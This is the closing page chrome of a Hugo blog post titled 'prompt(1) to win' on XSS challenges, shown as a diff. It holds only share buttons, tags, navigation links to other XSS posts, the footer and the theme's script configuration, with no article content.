+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://hannibal0x.github.io/2021-03-31-prompt1-to-win/" data-title="prompt(1) to win" data-hashtags="Web安全,XSS"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://hannibal0x.github.io/2021-03-31-prompt1-to-win/" data-hashtag="Web安全"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://hannibal0x.github.io/2021-03-31-prompt1-to-win/" data-title="prompt(1) to win"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://hannibal0x.github.io/2021-03-31-prompt1-to-win/" data-title="prompt(1) to win"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://hannibal0x.github.io/2021-03-31-prompt1-to-win/" data-title="prompt(1) to win"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/web%E5%AE%89%E5%85%A8/">Web安全</a>,&nbsp;<a href="/tags/xss/">XSS</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2021-03-27-xss%E5%BC%B9%E7%AA%97%E6%8C%91%E6%88%98/" class="prev" rel="prev" title="XSS弹窗挑战"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>XSS弹窗挑战</a>
+            <a href="/2021-04-04-xss-labs/" class="next" rel="next" title="XSS-Labs">XSS-Labs<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="utterances" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">utterances</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.101.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Hannibal0x</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hannibal0x/blog-comment"}},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"algoliaAppID":"LBWAPJR4IC","algoliaIndex":"blog","algoliaSearchKey":"3771060ae26cbca6e13551298e854580","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
